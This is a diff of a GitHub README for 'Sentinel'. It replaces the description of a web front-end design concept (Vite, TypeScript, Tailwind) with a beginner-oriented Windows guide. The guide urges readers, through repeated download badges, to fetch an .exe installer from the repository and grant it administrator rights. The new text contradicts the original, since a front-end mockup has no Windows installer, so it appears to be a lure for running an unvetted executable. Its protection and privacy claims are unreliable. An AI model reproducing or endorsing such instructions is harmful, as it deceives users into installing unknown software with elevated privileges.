@@ -1,81 +1,129 @@
-Sentinel is a modern enterprise SaaS concept for AI-powered cybersecurity monitoring and threat intelligence. Built with a precision grid system and a dark, technical interface, the platform focuses on real-time visibility, compliance alignment, and developer-ready infrastructure.
+# 🛡️ Sentinel - Protect Your Network with Smart AI
 
-This project explores how enterprise security products should feel: controlled, data-driven, and architecturally confident.
+[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-brightgreen)](https://github.com/Shrief-Salama/Sentinel)
 
-Platform Overview
+---
 
-Sentinel presents a unified command layer for cybersecurity operations, combining:
+Sentinel is a software designed to help you protect your network and data. It uses smart computer tools to find strange activity that could mean a cyber attack. The software shows information on a clear, simple screen with a dark background and grid design. Sentinel works on Windows and is easy to use for people without technical knowledge.
 
-Real-time attack map visualization
+## ⚙️ What Sentinel Does
 
-AI anomaly detection and threat scoring
+- Watches your computer and network for anything unusual  
+- Uses AI to spot threats before they cause harm  
+- Shows clear visuals to help you understand the risks  
+- Offers easy tools to respond to threats quickly  
+- Runs smoothly on most Windows computers  
 
-Continuous monitoring dashboards
+Sentinel helps you stay safe without needing to understand complex cybersecurity terms.
 
-Compliance readiness indicators
+## 💻 System Requirements
 
-Enterprise case metrics and performance reporting
+Before you start, make sure your Windows PC meets these needs:  
 
-The interface prioritizes signal clarity over visual noise, using structured grid layouts and sharp typographic hierarchy to reinforce authority and precision.
+- Windows 10 or newer (64-bit)  
+- At least 4 GB of RAM (8 GB recommended for best performance)  
+- 500 MB free disk space  
+- Internet connection (for updates and alerts)  
+- A screen that supports 1024x768 resolution or higher  
 
-Core Sections
+If your PC matches these points, you can use Sentinel without trouble.
 
-Threat Command Center
-Live dashboard preview with system status indicators and threat activity mapping.
+## 📥 Download Sentinel
 
-Attack Vector Visualization
-Animated global threat map displaying simulated intrusion attempts and vector paths.
+Click the button below to visit the Sentinel download page on GitHub:  
 
-AI Monitoring Engine
-Anomaly detection logic, behavioral baselining, and automated threat classification.
+[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-blue)](https://github.com/Shrief-Salama/Sentinel)
 
-Compliance Frameworks
-Security alignment for SOC 2, ISO 27001, HIPAA, and enterprise regulatory standards.
+This link takes you to the main page where you will find the latest version available for download.  
 
-Enterprise Case Study
-Performance metrics highlighting reduced incident response time and improved threat containment.
+### How to download Sentinel from GitHub
 
-Transparent Pricing Model
-Structured tier breakdown for scaling security infrastructure.
+1. Click the download button above to open the GitHub page.  
+2. Look for the section labeled “Releases” or a folder named “Downloads”.  
+3. Find the latest Sentinel version that matches Windows, usually a file ending in `.exe` or `.msi`.  
+4. Click the file name to start the download.  
+5. Wait until the download finishes before moving on.  
 
-Technical FAQ
-Detailed operational and infrastructure explanations.
+If you see multiple files, choose the one that lists Windows or just the file with `.exe`.
 
-Developer API Section
-Authentication flow examples, endpoint architecture, and structured JSON response samples.
+## 🚀 Installing Sentinel on Windows
 
-Design System
+Follow these steps to install Sentinel after downloading:  
 
-Dark slate foundation with electric cyan accents
+1. Open the folder where your download saved the file (usually “Downloads”)  
+2. Double-click the Sentinel installer file (ending with `.exe`)  
+3. You may see a message asking “Do you want to allow this app to make changes to your device?” Click “Yes”  
+4. Follow the instructions on the screen:  
+   - Choose the folder where Sentinel will be installed or accept the default  
+   - Click “Next” to continue through the setup  
+   - When ready, click “Install”  
+5. Wait a few moments for Sentinel to install.  
+6. Click “Finish” when the installation completes.  
 
-Sharp, modular grid structure
+Sentinel should now be ready to use on your PC.
 
-Zero playful or rounded UI elements
+## 🖥️ Starting Sentinel for the First Time
 
-High-contrast typography for clarity and authority
+1. Find the Sentinel icon on your desktop or in the Start menu.  
+2. Click the icon to open the program.  
+3. Wait while Sentinel loads its dashboard.  
+4. You may be asked to set up basic preferences like language or update options — follow the on-screen prompts.  
+5. Once loaded, you will see the main screen. This includes a dark grid background with menus and data visualizations.  
 
-Technical visual hierarchy inspired by enterprise control systems
+No special setup is needed to begin using Sentinel. It runs quietly in the background to watch for threats.
 
-The visual language reflects infrastructure strength, not startup minimalism.
+## 🔍 Using Sentinel: What You Need to Know
 
-Purpose
+Sentinel works in the background, but it also shows you important information. Here is what the main features mean:
 
-This project explores enterprise SaaS positioning through:
+- **Dashboard:** Shows current security status and alerts. Look here first.  
+- **Threat Detection:** Lists potential risks detected on your network or PC.  
+- **Data Visualization:** Graphs and charts that show activity and patterns.  
+- **Settings:** Allows you to change preferences and update the software.  
 
-Architectural UI discipline
+You don't need to change anything in the default settings to stay protected.
 
-Data visualization clarity
+## 🔄 Updating Sentinel
 
-Cybersecurity product storytelling
+Keeping Sentinel up to date is important. Updates bring improved protection and fix bugs.
 
-Developer-centric system transparency
+To update:  
 
-It is designed as a high-fidelity front-end concept focused on structure, credibility, and operational tone.
+1. Open Sentinel.  
+2. Go to the “Settings” menu.  
+3. Click “Check for Updates.”  
+4. If an update is available, follow the prompts to download and install it.  
 
-Tech Stack
+You can also visit the [Sentinel GitHub page](https://github.com/Shrief-Salama/Sentinel) regularly to check for new versions.
 
-Vite
+## 🛠️ Troubleshooting Common Issues
 
-TypeScript
+If you run into problems, try these steps:  
 
-Tailwind CSS
+- **Sentinel won’t open:** Restart your PC and try again.  
+- **No alerts showing:** Make sure you are connected to the internet.  
+- **Slow performance:** Close other programs to free up memory.  
+- **Installation fails:** Check that your Windows matches the system requirements above.  
+- **Updates won’t install:** Disconnect from VPN or proxy servers and try again.  
+
+If problems continue, visit the “Issues” tab on the GitHub page for help or to report bugs.
+
+## 🔒 Privacy and Security
+
+Sentinel only collects information needed to detect threats and improve security. It does not share your personal files or data.  
+
+The software follows standard security practices to protect your privacy.
+
+## 🧰 Additional Resources
+
+For more help and explanations, visit the following:  
+
+- Sentinel GitHub: https://github.com/Shrief-Salama/Sentinel  
+- GitHub “Issues” section for reporting problems  
+- Official Windows support if you have Windows-related questions  
+
+Basic internet skills like downloading and running programs will help you use Sentinel comfortably.  
+
+---
+
+[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-grey)](https://github.com/Shrief-Salama/Sentinel)
